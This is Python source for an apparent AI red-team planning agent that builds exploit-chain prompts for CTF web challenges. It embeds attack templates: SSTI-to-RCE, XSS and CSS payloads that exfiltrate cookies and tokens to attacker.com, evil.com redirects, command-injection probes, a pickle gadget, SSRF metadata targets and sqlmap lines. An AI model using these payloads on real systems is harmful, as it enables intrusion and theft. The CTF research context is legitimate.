from __future__ import annotations

import json
import os
import platform
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter, get_adapter
from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings
from core.template_manager import TemplateManager


def _get_os_context() -> str:
    system = platform.system().lower()
    if system == "windows":
        return """
【重要 - Windows 环境注意事项】
当前运行环境是 Windows 系统！
"""
    else:
        return """
【Linux/macOS 环境】
"""


def _extract_target_tags(confirmed: dict[str, Any]) -> list[str]:
    """从 confirmed_vuln.json 提取当前靶机的技术栈标签用于 ChromaDB 元数据过滤。

    标签来源（按优先级）：
    1. CWE ID 列表
    2. evidence / description 中的关键字词（库名、框架、协议、CVE 编号）
    3. 静态关键词表（基于常见漏洞类型 + 框架名精确匹配）
    4. title / vulnerability 字段

    返回值经过去重、小写、去噪，最多返回 15 个标签。
    """
    vulns = confirmed.get("vulnerabilities", [])
    target_ctx = confirmed.get("target_context", {})
    tags: list[str] = []

    # ── 1. CWE IDs ──
    for v in vulns:
        for key in ("cwe_id", "cwe"):
            cwe = v.get(key, "")
            if isinstance(cwe, str) and cwe.strip() and cwe.strip().upper() != "UNKNOWN":
                tags.append(cwe.strip().lower())

    # ── 2. 拼接所有文本字段做关键词提取 ──
    text_blob_parts: list[str] = []
    for v in vulns:
        for key in ("title", "description", "evidence", "attack_chain", "data_flow",
                     "source", "sink", "location"):
            val = v.get(key, "")
            if isinstance(val, str):
                text_blob_parts.append(val)
            elif isinstance(val, dict):
                text_blob_parts.append(val.get("code_snippet", ""))
    text_blob = " ".join(text_blob_parts)

    # CVE 编号（CVE-YYYY-NNNNN）
    for match in re.finditer(r'CVE-\d{4}-\d{4,}', text_blob, re.IGNORECASE):
        tags.append(match.group(0).lower())

    # 提取关键词：框架 / 库 / 协议 / 技术栈名称
    # 知名安全相关技术栈关键词
    known_keywords = [
        # Web frameworks
        "flask", "django", "fastapi", "express", "spring", "laravel", "rails",
        "asp.net", "aspnet", "node.js", "nodejs", "react", "vue", "angular",
        # Auth / JWT
        "jwt", "oauth", "oauth2", "saml", "openid", "jose", "jwk", "jws", "jwe",
        "python_jwt", "pyjwt", "authlib", "jwcrypto",
        # Proxy / LB
        "haproxy", "nginx", "apache", "traefik", "envoy", "caddy", "iis",
        # Protocols
        "http", "https", "websocket", "grpc", "graphql", "rest", "soap",
        # Serialization
        "pickle", "json", "yaml", "xml", "protobuf", "avro",
        # Databases
        "mysql", "postgresql", "postgres", "sqlite", "mongodb", "redis",
        "mssql", "oracle", "mariadb",
        # Languages
        "python", "java", "php", "ruby", "go", "golang", "javascript", "typescript",
        "c#", "csharp", "perl", "lua",
        # Template engines
        "jinja2", "jinja", "twig", "freemarker", "velocity", "thymeleaf", "mustache",
        "handlebars", "ejs", "pug", "nunjucks", "smarty",
        # Attack types (from CWE)
        "ssti", "sqli", "sql", "xss", "csrf", "ssrf", "rce", "lfi", "rfi",
        "path_traversal", "command_injection", "deserialization", "xxe",
        "idor", "auth_bypass", "algorithm_confusion",
        # Misc security terms
        "rsa", "rs256", "hs256", "ps256", "es256", "ed25519", "ecdsa",
        "sha256", "md5", "aes", "hmac",
        # Tool-specific
        "nuclei", "sqlmap", "burp", "metasploit",
        # Docker / infra
        "docker", "kubernetes", "k8s", "aws", "gcp", "azure",
    ]
    text_lower = text_blob.lower()
    for kw in known_keywords:
        if kw in text_lower:
            tags.append(kw)

    # ── 3. 从 target_context 提取 ──
    app_name = target_ctx.get("app_name", "")
    if isinstance(app_name, str) and app_name.strip():
        for word in app_name.lower().replace("_", " ").replace("-", " ").split():
            w = word.strip()
            if w and len(w) >= 2:
                tags.append(w)

    base_url = target_ctx.get("base_url", "")
    if isinstance(base_url, str):
        if "https" in base_url:
            tags.append("https")

    # ── 4. Evidence 中特定代码模式 ──
    evidence_specific: list[str] = []
    for v in vulns:
        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            evidence = evidence.get("code_snippet", "")
        if isinstance(evidence, str):
            evidence_specific.append(evidence)
    evidence_text = " ".join(evidence_specific)
    # 从代码片段中提取 import / require / use 语句中的库名
    for match in re.finditer(r'(?:import|from|require|use)\s+(\w+)', evidence_text):
        lib = match.group(1).lower()
        if lib not in ("os", "sys", "re", "json", "time", "io", "typing"):
            tags.append(lib)

    # ── 5. 去重 + 去噪 ──
    noise = {"", "unknown", "none", "a", "in", "of", "to", "is", "it", "be", "as", "at",
             "by", "an", "or", "on", "no", "so", "do", "if", "we", "he", "me", "my", "up",
             "the", "and", "for", "with", "that", "this", "from", "when", "file", "line",
             "rce", "lfi"}
    seen: set[str] = set()
    deduped: list[str] = []
    for t in tags:
        t = t.strip().lower()
        if t and t not in seen and t not in noise:
            seen.add(t)
            deduped.append(t)

    # Cap at 15 to keep the $or clause reasonable
    return deduped[:15]


_COMMON_RULES = """════════════════════ 沙箱执行约束 ════════════════════
1. 严禁 import os / subprocess / sys / ctypes / socket — 全部触发安全阻断
2. /workspace 只读！数据传递用 save_context/load_context 或写 /tmp/
3. HTTP 交互用 HttpClient (requests.Session 封装)，反连监听用 OOBReceiver
4. Python 代码必须多行缩进，严禁单行分号串联 (SyntaxError)
5. 禁止 pipe 到 sh/bash，禁止编造 URL 路径，禁止手写正则解析 HTML/JSON/JWT

═══════════════ SDK 速查表 (redteam_sdk) ═══════════════
from redteam_sdk import HttpClient, ContextStore, OOBReceiver, save_context, load_context, output_result

# base_url 从 context.json 动态读取，禁止硬编码域名
import json, urllib3; urllib3.disable_warnings()
with open('/workspace/context.json') as f: ctx = json.load(f)
target_base = ctx.get('target_context', {}).get('base_url', '')
s = HttpClient(target_base)          # 自动恢复/保存 Session Cookie

s.get(path) / s.post(path, data=...) / s.put(path, json=...) / s.delete(path)
s.raw_request('GET', '/path#frag')    # WAF绕过：保留 # %00 ..;/ 等字符（返回 RawResponse(有 .status_code .text .headers .json())）
s.auto_extract_csrf()                 # 从 JWT cookie 或 HTML 自动提取 antiCSRFToken

ctx = ContextStore(); ctx.save('k', v); ctx.load('k')   # 跨步骤 KV 存储
save_context('k', v); load_context('k'); output_result(dict)  # 快捷方式

oob = OOBReceiver(port=8765); oob.start()  # Blind RCE 带外反连
hit = oob.wait_for_callback(timeout=30)    # 等待目标回连
oob.stop()

# 数据解析：HTML→BeautifulSoup, JSON→r.json(), JWT→base64+json, 禁止手写正则
# REST 调试：Form=用data=, JSON=用json=; 401→先确认登录成功; 405→换Method
# Shell 步骤: curl|jq ✅  curl|sh ❌; sqlmap -u "URL" --batch --level=2
"""


def _discover_blueprint_prefixes(confirmed: dict[str, Any]) -> dict[str, str]:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return {}

    prefixes: dict[str, str] = {}

    bp_pattern = re.compile(r"""register_blueprint\((\w+)\s*,\s*url_prefix\s*=\s*['\"](/[^'\"]*)['\"]""")
    route_raw_pattern = re.compile(r"""@(\w+)\.route\(['\"](/[^'\"]*)['\"]""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
        else:
            code = str(evidence)

        for match in bp_pattern.finditer(code):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

        description = vuln.get("description", "") + vuln.get("attack_chain", "")
        for match in bp_pattern.finditer(description):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

    if not prefixes:
        for vuln in vulns:
            evidence = vuln.get("evidence", "")
            if isinstance(evidence, dict):
                code = evidence.get("code_snippet", "")
            else:
                code = str(evidence)
            description = vuln.get("description", "") + vuln.get("attack_chain", "")
            all_text = f"{code} {description}"

            for match in route_raw_pattern.finditer(all_text):
                bp_name = match.group(1)
                if bp_name in ("web", "api"):
                    if bp_name not in prefixes:
                        if bp_name == "web":
                            prefixes[bp_name] = "/challenge"
                        elif bp_name == "api":
                            prefixes[bp_name] = "/challenge/api"

    return prefixes


def _extract_endpoints_from_vulns(vulns: list[dict[str, Any]], prefixes: dict[str, str]) -> list[str]:
    seen = set()
    endpoints: list[str] = []

    route_re = re.compile(r"""@(\w+)\.route\(['\"](/[\w/<>-]*)['\"]""")
    url_re = re.compile(r"""(?:POST|GET|PUT|DELETE|PATCH)\s+(/\S+)""")
    path_re = re.compile(r"""/[\w.-]*(?:api|challenge|login|register|profile|upload|download|report|add(?:Item|Contract|Product)|sendVerification|product|admin|contract|verify|settings|home|external|logout|static|user|auth|file|image|comment|post|search|query|admin|api|rest|graphql|ws|socket)[\w/<>?&=._-]*""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
            file_path = evidence.get("file", "")
        else:
            code = str(evidence)
            file_path = ""

        attack_chain = vuln.get("attack_chain", "")
        data_flow = vuln.get("data_flow", "")
        description = vuln.get("description", "")

        all_text = f"{code} {attack_chain} {data_flow} {description} {file_path}"

        for match in route_re.findall(all_text):
            bp_name, ep = match
            ep = ep.strip()
            prefix = prefixes.get(bp_name, "")
            full = prefix + ep if prefix else ep
            if full not in seen:
                seen.add(full)
                endpoints.append(full)

        for match in url_re.findall(all_text):
            ep = match.strip()
            if ep not in seen:
                seen.add(ep)
                endpoints.append(ep)

        for match in path_re.findall(all_text):
            ep = match.strip()
            if "?" in ep:
                ep = ep.split("?")[0]
            ep = ep.rstrip("/. ")
            if not ep or ep in seen:
                continue
            if re.search(r"\.(py|html|js|css|c|h|txt|md)$", ep):
                continue
            if re.search(r"/(application|blueprints|templates|static|config|middleware|database|util|bot|email|release|node_modules|vendor)/", ep):
                continue
            if re.search(r"(cybench_web_challenges|target_codebase)", ep):
                continue
            if ep in ("/contracts", "/challenge", "/"):
                continue
            seen.add(ep)
            endpoints.append(ep)

    for ep in list(endpoints):
        if prefixes and not any(ep.startswith(p) for p in prefixes.values()):
            default_prefix = next(iter(prefixes.values()))
            resolved = default_prefix + ep
            if resolved not in seen:
                seen.add(resolved)
                endpoints.append(resolved)

    return [ep for ep in endpoints if ep.startswith("/")]


def _build_vuln_table(vulns: list[dict[str, Any]]) -> str:
    lines = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")
        cwe = v.get("cwe_id", "?")
        severity = v.get("severity", "?")
        source = v.get("source", "")
        sink = v.get("sink", "")
        lines.append(
            f"  [{severity}] {vid} | {cwe} | {title}\n"
            f"    攻击面: {source} -> {sink}"
        )
    return "\n".join(lines)


def _build_evidence_extracts(vulns: list[dict[str, Any]]) -> str:
    parts = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")

        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            file = evidence.get("file", "")
            lines_info = evidence.get("lines", "")
            code = evidence.get("code_snippet", "")
        else:
            file = ""
            lines_info = ""
            code = str(evidence)

        attack_chain = v.get("attack_chain", "")
        data_flow = v.get("data_flow", "")
        source = v.get("source", "")
        sink = v.get("sink", "")
        description = v.get("description", "")

        block_parts = [f"## {vid}: {title}"]
        if file:
            block_parts.append(f"文件: {file} (行 {lines_info})")
        block_parts.append(f"攻击面: source={source}, sink={sink}")
        if attack_chain:
            block_parts.append(f"攻击链: {attack_chain}")
        if data_flow:
            block_parts.append(f"数据流: {data_flow}")
        if description:
            block_parts.append(f"描述: {description}")
        if code:
            block_parts.append(f"漏洞代码:\n```\n{code}\n```")

        parts.append("\n".join(block_parts))

    return "\n\n".join(parts)


def _build_cwe_templates_generic(cwe_set: set[str]) -> str:
    templates = []

    if "CWE-94" in cwe_set or "CWE-917" in cwe_set:
        templates.append("""
【SSTI/模板注入攻击模板（CWE-94/CWE-917）— 通用版】：
常见触发点：邮件渲染、页面模板、PDF生成、日志记录
常见框架：Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java)

基础探测payload（验证SSTI是否存在）：
{{7*7}}  → 期望输出 49
${7*7}   → 期望输出 49（Freemarker）
#{7*7}   → 期望输出 49（Thymeleaf）

Jinja2 SSTI→RCE payload示例（根据实际注入点调整参数名）：
import requests,urllib3,json; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
r=requests.post(f'{base}{INJECTION_ENDPOINT}', data={'EMAIL_FIELD':payload+'@x.com','OTHER_FIELDS':'values'}, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+json.dumps({'status':r.status_code,'body':r.text[:300]}))

注意：
- SSTI执行结果通常不会直接返回给攻击者！需要配合其他漏洞（如XSS、文件写入、外带DNS）获取结果
- 根据证据中的 attack_chain 确认具体的注入点和触发路径
- 如果目标有邮件发送功能，SSTI可能在邮件渲染时触发
""")

    if "CWE-79" in cwe_set:
        templates.append("""
【XSS/CSS注入攻击模板（CWE-79）— 通用版】：
分类与利用场景：

1. 存储型XSS（持久化）：
   - 用户资料、评论、商品描述等存储后由其他用户/管理员查看的字段
   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   - 或 <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

2. CSS注入（属性选择器数据外带）：
   - 当页面包含敏感值在HTML元素中时（如<input value="SECRET">）
   - 利用CSS属性选择器逐字符泄露：
     input[value^="a"] { background:url(https://attacker.com/char?a) }
     input[value^="ab"] { background:url(https://attacker.com/prefix?ab) }
   - 匹配成功时浏览器自动发起请求，逐字符泄露token/secret

3. DOM-based XSS：
   - 危险函数：innerHTML, document.write(), eval(), setTimeout(), location.hash
   - 寻找未过滤的用户输入直接插入DOM的位置

4. Service Worker注入：
   - 如果应用注册了SW且SW源可控制，可劫持所有网络请求
   - 注入恶意SW后可拦截/修改请求、窃取cookie

通用利用流程：
Step 1 - 注入payload到可存储字段
Step 2 - 触发管理员/Bot访问含payload的页面（report功能、分享链接等）
Step 3 - 在attacker服务器接收窃取的数据（cookie/token/session）
Step 4 - 用窃取的凭证进行权限提升操作
""")

    if "CWE-352" in cwe_set:
        templates.append("""
【CSRF保护绕过策略（CWE-352）— 通用版】：
常见CSRF保护机制及绕过方法：

1. Token验证（Referer/Origin检查）：
   - 绕过：如果token可通过XSS/CSS注入获取，则可构造完整CSRF请求
   - 绕过：如果token验证不严格（接受空值、任意值）

2. SameSite Cookie：
   - Strict: 完全阻止跨站（最难绕过）
   - Lax: GET请求可跨站（可结合开放重定向）
   - None: 无保护（需Secure标志+HTTPS）

3. JWT中的CSRF token：
   - 如果JWT存储在非HttpOnly cookie中，JS可读取
   - 通过XSS/CSS提取JWT内的CSRF token
   - 用提取的token构造合法请求

通用绕过思路：
A - 先通过其他漏洞（XSS/CSS注入）获取CSRF token
B - 分析token生成逻辑，尝试预测/伪造
C - 寻找无需token的API端点（遗漏）
D - 如果是双token机制（cookie+header），尝试只满足其中一个
""")

    if "CWE-362" in cwe_set:
        templates.append("""
【竞态条件利用策略（CWE-362）— 通用版】：
典型场景：
- 文件上传：TOCTOU（Time of Check to Time of Use）竞争
- 权限变更：先检查后更新的非原子操作
- 资源分配：并发请求抢夺同一资源
- 状态转换：支付/审批等多状态系统的状态竞争

通用利用框架（Python threading）：
import requests,urllib3,json,threading,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
s=requests.Session(); s.verify={VERIFY_FLAG}
results=[]; errors=[]
def race_request(payload_data, label):
    try: r=s.post(f'{base}{RACE_ENDPOINT}', data=payload_data, cookies=s.cookies); results.append((label,r.status_code,r.text[:200]))
    except Exception as e: errors.append(str(e))
threads=[threading.Thread(target=race_request, args=(data1,'req1')), thread.Thread(target=race_request, args=(data2,'req2'))]
[t.start() for t in threads]; [t.join() for t in threads]
print('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))

关键要点：
- 并发线程数通常10-50个，取决于TOCTOU窗口大小
- 两个请求的参数必须有冲突（一个合法一个越权）
- 需要多次循环尝试（竞态窗口可能只有毫秒级）
- 成功标志：返回结果中出现越权操作的痕迹
""")

    if "CWE-434" in cwe_set:
        templates.append("""
【文件上传漏洞利用（CWE-434）— 通用版】：
常见攻击向量：

1. 路径遍历（../../../）：
   - filename参数注入 ../ 写入任意位置
   - 目标：webshell (.php/.jsp/.asp)、配置文件覆盖、cron job

2. 文件类型伪造：
   - Magic bytes伪造：%PDF- (PDF), GIF89a (GIF), PK\\x03\\x04 (ZIP)
   - 双扩展名：shell.php.jpg (配合Apache解析漏洞)
   - Null字节截断：shell.php%00.jpg (旧版本)

3. 元数据/头信息注入：
   - ExifTool处理的JPEG/PDF可注入命令
   - SVG文件内嵌JavaScript
   - Office宏（.docm/.xlsm）

4. 存储型XSS via文件名：
   - 文件名反射到HTML时未转义

通用测试流程：
Step 1 - 上传正常文件确认功能可用
Step 2 - 尝试magic bytes伪造（%PDF-开头+恶意内容）
Step 3 - 尝试路径遍历（filename=../../evil.php）
Step 4 - 尝试元数据注入（如果有ExifTool/ImageMagick处理）
Step 5 - 如果有解析/预览功能，尝试对应格式的RCE
""")

    if "CWE-601" in cwe_set:
        templates.append("""
【开放重定向利用（CWE-601）— 通用版】：
测试方法：修改url/redirect/next/target/callback参数为外部域名
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
r=requests.get(f'{base}{REDIRECT_ENDPOINT}?url=https://evil.com', allow_redirects=False, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'location':r.headers.get('Location')}))
利用场景：钓鱼攻击、窃取OAuth token、绕过referer检查
""")

    if "CWE-89" in cwe_set:
        templates.append("""
【SQL注入攻击模板（CWE-89）— 通用版】：
快速验证：' OR '1'='1' -- / " OR "1"="1
自动化工具：sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]
手动注入流程：
1. 确定注入点（参数/Headers/Cookie）
2. 判断数据库类型（报错差异/注释符/内置函数）
3. 确定字段数（ORDER BY 1,2,3...）
4. 获取数据库名/表名/列名
5. 提取敏感数据（credentials/flags）
""")

    if "CWE-78" in cwe_set:
        templates.append("""
【命令注入策略（CWE-78）— 通用版】：
分隔符：; & && | || $() ` \\n %0a %0d
测试payload：;whoami / $(whoami) / `whoami` / | whoami
盲注技巧：sleep 5 / ping -c 5 attacker.com（时间侧信道）
""")

    if "CWE-502" in cwe_set:
        templates.append("""
【反序列化攻击模板（CWE-502）— 通用版】：
Pickle (Python)：pickle.dumps((os.system,('cmd',)))
Java: ysoserial生成gadget链
PHP: unserialize() + POP chain
注意：反序列化通常需要知道目标使用的库版本以构造正确的gadget链
""")

    if "CWE-918" in cwe_set:
        templates.append("""
【SSRF攻击策略（CWE-918）— 通用版】：
内网探测：127.0.0.1:6379(Redis), localhost:3306(MySQL), localhost:8080
云元数据：169.254.169.254(AWS/GCP/Azure)
绕过WAF：十进制IP(2130706433=127.0.0.1)、短URL重定向、DNS rebinding
""")

    if templates:
        return "\n".join([
            "【CWE专项攻击模板 — 通用版】（以下模板适用于各类CTF/Web安全题目，请根据实际目标调整{TARGET_BASE_URL}和{INJECTION_ENDPOINT}等占位符）：",
            *templates,
        ])
    return ""


def _build_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any]) -> str:
    mgr = TemplateManager()
    external_templates = mgr.get_templates_for_target(confirmed)
    if external_templates:
        return external_templates
    cwe_set = {v.get("cwe_id", "") for v in vulns}
    return _build_cwe_templates_generic(cwe_set)


def build_dynamic_prompt(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None) -> str:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return "你是 Co-RedTeam 规划智能体。\n" + _COMMON_RULES

    target_context = confirmed.get("target_context", {})
    target_base = target_context.get("base_url", os.getenv("CO_REDTEAM_TARGET_BASE", ""))

    if not target_base:
        return (
            "【严重配置错误】目标基础 URL 为空！\n"
            "请在 confirmed_vuln.json 的 target_context.base_url 字段指定目标地址，"
            "或设置环境变量 CO_REDTEAM_TARGET_BASE。\n"
            "例如：设置环境变量 CO_REDTEAM_TARGET_BASE=https://真实IP:端口 或在 CLI 使用 --url 参数\n"
            "无法生成攻击计划，请先修复配置后再运行。"
        )

    target_name = target_context.get("app_name", "目标应用")
    
    is_https = target_base.startswith("https://")
    protocol_hint = f"\n【协议检测】：目标使用 {'HTTPS (SSL/TLS)' if is_https else 'HTTP (明文)'}，所有请求必须使用 {'https://' + ('加 verify=False 参数' if is_https else '') if is_https else 'http://' + ('不需要 verify=False' if not is_https else '')}"

    prefixes = _discover_blueprint_prefixes(confirmed)
    endpoints = _extract_endpoints_from_vulns(vulns, prefixes)

    discovered_routes = target_context.get("discovered_routes", [])
    if discovered_routes:
        route_re = re.compile(r"""@(\w+)\.route\('([^']*)'\)""")
        for raw in discovered_routes:
            m = route_re.search(raw)
            if m:
                bp_name, ep = m.group(1), m.group(2)
                prefix = prefixes.get(bp_name, "")
                full = prefix + ep if prefix else ep
                if full not in endpoints:
                    endpoints.append(full)

    endpoints.sort()

    vuln_table = _build_vuln_table(vulns)
    evidence_extracts = _build_evidence_extracts(vulns)
    cwe_templates = _build_cwe_templates(vulns, confirmed)
    os_context = _get_os_context()

    bp_info = ""
    if prefixes:
        bp_lines = [f"  {name} -> 前缀 {prefix}" for name, prefix in sorted(prefixes.items())]
        bp_info = "\n【已发现的 Blueprint 前缀映射】：\n" + "\n".join(bp_lines) + "\n  所有端点都已自动加上对应前缀，请直接使用完整URL。\n"

    if not endpoints:
        endpoints_str = "  （从evidence/attack_chain中提取；如果没有则根据代码片段合理推断）"
    else:
        endpoints_str = "\n".join(f"  {ep}" for ep in endpoints)

    if endpoints:
        endpoints_str += "\n\n【URL构造规则】：以上端点已经包含完整的 Blueprint 前缀（如 /challenge/api/register）。获取完整URL时直接拼接: {base_url}{endpoint}。"

    challenge_rules = ""
    if adapter is not None:
        challenge_rules = adapter.extra_rules()

    # ── 核心攻击逻辑（前置，让 LLM 第一眼看到最关键的信息）──────
    core_logic = f"""你是 Co-RedTeam 规划智能体。设计能拿到 flag 的完整攻击链。

目标: {target_base} ({target_name}) — {protocol_hint}
蓝图层: {bp_info if bp_info else '无'}
端点: {endpoints_str}

═══════════════ ★ 漏洞核心证据与攻击链（← 从这里开始！） ═══════════════
你必须基于以下 Stage 1 审计结果制定计划。如果漏洞有 CVE 编号，严格按对应 PoC 逻辑编写 exploit 代码。
{evidence_extracts}

══════════════ 漏洞概览 ═══════════════
{vuln_table}"""

# ── CWE 模板 + 规则放后面，作为参考而非主读材料 ──
    if cwe_templates:
        core_logic += f"\n\n【CWE 专项模板参考】\n{cwe_templates}"

    core_logic += f"""

【攻击链设计要求】
1. 根据漏洞依赖关系设计从入口到 flag 的完整路径
2. 第一步必须以探测/验证开头，最后一步必须尝试获取 flag
3. 步骤间数据通过 ContextStore/save_context/output_result 传递
4. 遇到 HAProxy/WAF 路径规则绕过，使用 raw_request() 原样发送 #/%00/..;/ 字符
5. Blind RCE 时立即切换 OOBReceiver 带外反连

【JSON 格式要求】
顶层字段: version(1), plan_id(str), vuln_summary(str), rationale(str), chain_design(str), steps(list), history_state(对象)
每个 step: id(int), status("PLANNED"), type("python"|"shell"), command(str: 完整多行脚本), purpose(str), expected_outcome(str), depends_on(str|null), on_failure("BLOCK_AND_DEBUG"|"SKIP")
history_state: {{"tried_payloads":[...], "failed_reasons":[...], "consecutive_failures_per_category":{{}}, "forced_path_switch":"...""}}

【防死循环】
- 禁止重复 tried_payloads 中的 payload
- 同类漏洞连败 ≥3 次强制切换攻击路径
- rationale 开头说明本轮与前轮的关键区别

	【🔴 VERBATIM COPY — 精确复制规则（最高优先级，违反则攻击必然失败）】
	当 CWE 模板或长期记忆中出现以下任一标记时，你必须逐字符原样复制代码，严禁做任何改写：
	  标记 1: "EXACT FORGE FUNCTION (verbatim copy — DO NOT MODIFY)"
	  标记 2: "CRITICAL RULES (violation = exploit fails)"
	  标记 3: "【绝对禁止】"

	严禁的改写行为（这些行为已导致多次任务失败）：
	  ❌ 禁止用 json.dumps(dict) 替代字符串拼接（JSON key 顺序对漏洞利用至关重要）
	  ❌ 禁止在 base64 编码后调用 .rstrip('=')（python_jwt 内部解码器需要完整 padding）
	  ❌ 禁止改变 polyglot 构造中的 key 顺序（必须把伪造 key 放在 JSON 对象的第一个位置）
	  ❌ 禁止用 requests.get() 替代 raw_request() 处理含 # 的路径（requests 库会丢弃 # 后的内容）
	  ❌ 禁止用 f-string 中的 {{header}}.{{payload}}.{{signature}} 替代模板中的固定拼接方式

	正确做法：见到 "verbatim copy" 标记 → 直接复制模板中的完整函数体 → 在 step.command 中调用它

【Step 状态机】
PLANNED→IN_PROGRESS→DONE(exit_code=0)|BLOCKED(exit_code≠0)→追加排错步骤

{_COMMON_RULES}
{challenge_rules}
"""

    prompt = core_logic

    return prompt


def _build_memory_context(
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None = None,
) -> str:
    """RAG 检索 + 元数据过滤：从 L1(模式) / L2(策略) / L3(技术) 提取相关经验。

    核心改进（v2）：
    1. 先从 confirmed_vuln.json 提取 target_tags（JWT / haproxy / python 等）
    2. 三层检索全部加 where 过滤，只召回 tags_str 匹配的条目
    3. 过滤无结果时自动降级为无过滤检索（由 memory_store 内部实现）
    4. 彻底解决"打 LockTalk 搜出致远 OA 脚本"的问题
    """
    vulns = confirmed.get("vulnerabilities", [])
    cwe_ids: list[str] = [
        v.get("cwe_id", "") for v in vulns if v.get("cwe_id")
    ]
    vuln_titles = " ".join(v.get("title", "") for v in vulns)[:300]
    vuln_desc = " ".join(
        f"{v.get('source', '')} {v.get('sink', '')} {v.get('description', '')}"
        for v in vulns
    )[:500]

    # ── 提取技术栈标签用于 ChromaDB 元数据过滤 ──
    target_tags = _extract_target_tags(confirmed)

    # ── 从 feedback 提取错误指纹用于精准避坑检索 ──
    error_hints = ""
    if feedback:
        errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        stderr_snippets = " ".join(str(e) for e in errors)[:200]
        fb_text = feedback.get("feedback_for_planner", "")[:300]
        fb_summary = feedback.get("summary", "")[:200]
        error_hints = f"{stderr_snippets} {fb_text} {fb_summary}"

    context_parts: list[str] = []

    # ═══════════════════════════════════════════════════════════════
    # L1 — 漏洞模式（pattern_collection）[元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    pattern_query = f"{' '.join(cwe_ids)} {vuln_titles} 漏洞模式 检测路径"
    pattern_results = memory.query_patterns_filtered(
        pattern_query, filter_tags=target_tags, n_results=3,
    )
    if pattern_results:
        context_parts.append("  【L1·漏洞模式】")
        for i, item in enumerate(pattern_results):
            context_parts.append(f"    ▸ {item['content'][:300]}")

    # ═══════════════════════════════════════════════════════════════
    # L2 — 利用策略（strategy_collection），成功 + 失败分列 [元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    success_hits: list[str] = []
    failure_hits: list[str] = []

    # CWE-keyed 成功策略
    for cwe in cwe_ids[:3]:
        results = memory.query_strategies_filtered(
            query_text=f"{cwe} {vuln_titles[:100]} 利用 攻击 payload 绕过",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            stype = item.get("metadata", {}).get("strategy_type", "")
            if stype != "failure":
                content = item["content"][:250]
                if content not in success_hits:
                    success_hits.append(content)

    # 通用成功策略兜底
    if len(success_hits) < 3:
        results = memory.query_strategies_filtered(
            query_text=f"{vuln_desc[:200]} 漏洞利用 成功 攻击步骤",
            filter_tags=target_tags,
            n_results=5,
        )
        for item in results:
            stype = item.get("metadata", {}).get("strategy_type", "")
            if stype != "failure":
                content = item["content"][:250]
                if content not in success_hits:
                    success_hits.append(content)

    # 失败教训：CWE-keyed + error-keyed
    for cwe in cwe_ids[:3]:
        results = memory.query_strategies_filtered(
            query_text=f"{cwe} 失败 错误 教训 避坑 不要",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            if item.get("metadata", {}).get("strategy_type") == "failure":
                content = item["content"][:250]
                if content not in failure_hits:
                    failure_hits.append(content)

    if error_hints.strip():
        results = memory.query_strategies_filtered(
            query_text=f"{error_hints[:300]} 失败 错误 修复",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            if item.get("metadata", {}).get("strategy_type") == "failure":
                content = item["content"][:250]
                if content not in failure_hits:
                    failure_hits.append(content)

    if success_hits:
        context_parts.append("  【L2·成功策略】")
        for i, s in enumerate(success_hits[:5]):
            context_parts.append(f"    ✅ {s}")
    if failure_hits:
        context_parts.append("  【L2·失败教训（禁止重复！）】")
        for i, fh in enumerate(failure_hits[:5]):
            context_parts.append(f"    ❌ {fh}")

    # ═══════════════════════════════════════════════════════════════
    # L3 — 技术操作（tech_collection）★ 最关键的一层 ★ [元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    tech_items: list[dict[str, Any]] = []
    for cwe in cwe_ids[:3]:
        results = memory.query_tech_payloads_filtered(
            query_text=f"{cwe} payload 攻击 利用 命令 脚本",
            filter_tags=target_tags,
            n_results=8,
        )
        for item in results:
            if item["content"] not in [t["content"] for t in tech_items]:
                tech_items.append(item)

    # 通用 payload 兜底
    if len(tech_items) < 5:
        results = memory.query_tech_payloads_filtered(
            query_text=f"{vuln_desc[:300]} {vuln_titles[:150]} payload 注入 攻击",
            filter_tags=target_tags,
            n_results=8,
        )
        for item in results:
            if item["content"] not in [t["content"] for t in tech_items]:
                tech_items.append(item)

    if tech_items:
        context_parts.append("  【L3·特种 Payload / 脚本（可直接复用！）】")
        payload_seen: set[str] = set()
        for i, item in enumerate(tech_items[:8]):
            payload = item.get("payload") or ""
            cmd = item.get("command") or ""
            script = item.get("script") or ""
            meta = item.get("metadata", {})
            name = meta.get("name", "") or meta.get("context", "") or ""
            source = meta.get("source", "")
            source_tag = f" [来源:{source}]" if source else ""

            if payload and payload not in payload_seen:
                payload_seen.add(payload)
